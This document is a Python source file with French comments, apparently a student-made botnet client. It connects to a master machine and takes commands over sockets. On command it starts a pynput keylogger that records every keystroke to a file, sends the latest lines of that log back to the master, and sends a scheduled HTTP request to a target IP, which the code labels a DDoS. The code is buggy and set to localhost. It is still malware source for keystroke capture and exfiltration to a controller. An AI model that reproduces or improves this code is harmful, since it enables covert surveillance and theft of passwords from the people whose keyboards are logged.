#importation du module socket afin de permetttre une communication réseau
import socket as modSocket
from pynput.keyboard import Key, Listener
import logging
import threading
import time
from datetime import datetime
import argparse
import requests


"""
creation de l'objet Connexion, composé de 4 champs et 3 méthodes

1ère methode : elle va permettre d'écouter sur un port donné et une adresse, une fois els connexion acceptée elle recevra en continu
dans une boucle while les messages envoyé par le maitre, selon le message reçu le slave lancera une méthode présentes dans
l'interface Action.

2ème methode : va re-ecouter si jamais un problème a été signalé plutôt dans le code, elle va juste fermer la carte reseau, elle re lancer.

3ème methode : ces celle qui va se lancer en premier, elle va se connecter à une machine distante en lui envoyant un message. et va finir
en lançant la première méthode

"""

class Connexion():
    # création de l'objet connexion avec le champ adresseMachine
    def __init__(self, adresseMachine, carteReseauEcoute, carteReseauConn, donnee):
        self.carteReseauEcoute = carteReseauEcoute
        self.carteReseauConn = carteReseauConn
        self.donnee = donnee
        self.port = port



    #1er étape, mettre en place un canal de communication pour recevoir les messages du master
    def listen(self, carteReseauEcoute, donnee, port):
        # écoute sur toutes l'adresse du slave et sur le port 60 000
        adresseMachineMaitre = (("localhost", port))
        carteReseauEcoute.bind(adresseMachineMaitre)
        # une fois connecté, on le met en écoute et on accepte la connexion afin qu'il reçoive les instruction du master
        
        print("J'écoute")
        carteReseauEcoute.listen(5)
        connReseau, addr = carteReseauEcoute.accept()
        print("Connecté avec la machine : ", addr)

        #boucle qui permet de lancer une methode de l'objet communication
        try:
            while donnee != "FIN":
                if donnee == "keylogger":
                    print("OK je lance le keylogger")
                    #lance la methode start_log de l'objet Communication
                    threading.Thread(target=a.start_log, args=()).start()
                elif donnee == "stop":
                    print("J'arrête le keylogger")
                    a.stop_log(connReseau)
                elif donnee == "transfert":
                    print("J'envoie le keylogger")
                    a.get_log(connReseau, donnee)
                elif donnee == "ddos":
                    print("on lance le ddos")
                    threading.Thread(target=a.ddos, args=(connReseau, )).start()
                donnee = connReseau.recv(1024).decode("utf-8")
        except ConnectionResetError:
            print("Connexion arreté par le maitre")
            a.reEcoute(carteReseauEcoute)
        a.reEcoute(carteReseauEcoute)

        
    def reEcoute(self, carteReseauEcoute):
        print("Fini je re-écoute")
        carteReseauEcoute.close()
        carteReseauEcoute = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
        a.listen(carteReseauEcoute, donnee, port)

        

    # 2è étape, mettre en place un canal de communication pour envoyer des messages au master
    def sendIP(self, carteReseauConn, port):
        try:
            # on définit les coordonnées sur lesquelles le slave va envoyer son adresse ip
            carteReseauConn.connect(("localhost", port))
            carteReseauConn.send(b"Je me connecte")
            print("IP envoyée au master")
            a.listen(carteReseauEcoute, donnee, port)
        except ConnectionRefusedError:
            print("Machine maitre non connecté")
            a.listen(carteReseauEcoute, donnee, port)
        
"""
creation de l'objet Action , qui va être enfant de l'objet Connexion, Il est composé
de 5 méthodes et d'un seul champ.

1ère methode et 2ème (start_log, appuie): Ces 2 méthodes vont permettre de lancer le keylogger, start_log va avoir besoin de la méthode
appuie pour fonctionner.

3ème methode (stop_log): va stopper le start_log

4ème methode (get_log): va aller chercher le fichier "keylogger.txt", le mettre à l'envers et prendre le nombre de ligne que veut le maitre,
puis va lui envoyer

5ème methode (ddos): tu avs peut être changer

"""

class Action(Connexion):

    def __init__(self, donnee):
        self.donnee = donnee
        #assigne listener à la méthode appuie
        self.listener = Listener(on_press=self.appuie)
        self.chemin = chemin

    def start_log(self):
        try:
            #chemin ou seront écris les logs voulus
            log_dir = chemin
            #met les informations de base concernant le logger
            #filename, spécifie le nom du fichier
            #format, impose les infos de base qui se trouveront dans le logger, içi la date avec l'heure puis les infos sur les entrées sur le clavier 
            logging.basicConfig(filename = (log_dir + "\\keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
            #listener.start va commencer a écouter grace a la methode appuie qui est assigné à la varibale listener
            self.listener.start()
        except FileNotFoundError:
            print("erreur chemin inexistant")
    #Création d'une fonction appuie(), qui vas mettre en string touts les appuie sur le clavier
    def appuie(self, key):
        logging.info(str(key))
    
    def stop_log(self, connReseau):
        if  not self.listener.is_alive():
            connReseau.send("Logger non lancé".encode("utf-8"))
            print("erreur")
        else:
            #listener.start va arreter d'écouter en fermant la methode appuie qui est assigné à la varibale listener
            self.listener.stop()
            connReseau.send("Logger arreté".encode("utf-8"))
            print("logger arreté")
            
        
        
    def get_log(self, connReseau, donnee):
        logger = open("D:\\keyLog.txt", "r")
        #lis le fichier ligne à ligne
        fichier = logger.readlines()
        
        #boucle qui permet de compter le nombre de ligne
        nb_lines = 0
        for line in logger.readlines():
            nb_lines+=1
        #on reçoit le nombre de ligne que le maitre veut récuperer
        lines = connReseau.recv(1024).decode("utf-8")
        #crée la variable linesINT qui va juste transormer un str en int
        linesInt = int(lines)
        #si tu sais elisa ce que ça fait tu peut le mettre ?
        start = nb_lines-1-linesInt
        fin = str(fichier[start:])
    
        connReseau.send(fin.encode("utf-8"))

    def ddos(self, connReseau):
        #définir le format de la date quand on la rentrera dans la variable
        date = connReseau.recv(1024).decode("utf-8")
        print(date)
        format = "%Y-%m-%d %H:%M"
        #on récupère la date et l'heure actuelle et on la formate comme voulu ci dessus
        now = datetime.strftime(datetime.now(), format)
        print(now)

        ip = connReseau.recv(1024).decode("utf-8")
        url = "http://" + ip
        #on compare la date et l'heure récupérées à celle souhaitée pour le ddos
        while (now != date):
            print("En attente ...")
            time.sleep(10)
            now = datetime.strftime(datetime.now(), format)

        requête = requests.get(url)
        print("Requête : ", requête.text)
  






carteReseauEcoute = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
carteReseauConn = modSocket.socket(modSocket.AF_INET, modSocket.SOCK_STREAM)
donnee = ""
chemin = ""
port = "" 
a = Action(donnee)

#initiation d'argparse avec les arguments
parser = argparse.ArgumentParser()
#creation de la commande --listen
parser.add_argument("--conn", type=int,
                     help="se connecte a une machine distante sur un port donné")
#creation de ala commande --upload
parser.add_argument("--log", type=str,
                     help="on met le chemin ou va être créer le fichier keylog.txt" )

#on initie la variable args, qui va contenire les arguments
args = parser.parse_args()
if args.conn:
    port = args.conn
    print(port)
    chemin = args.log
    print(chemin)
    a.sendIP(carteReseauConn, port)

    


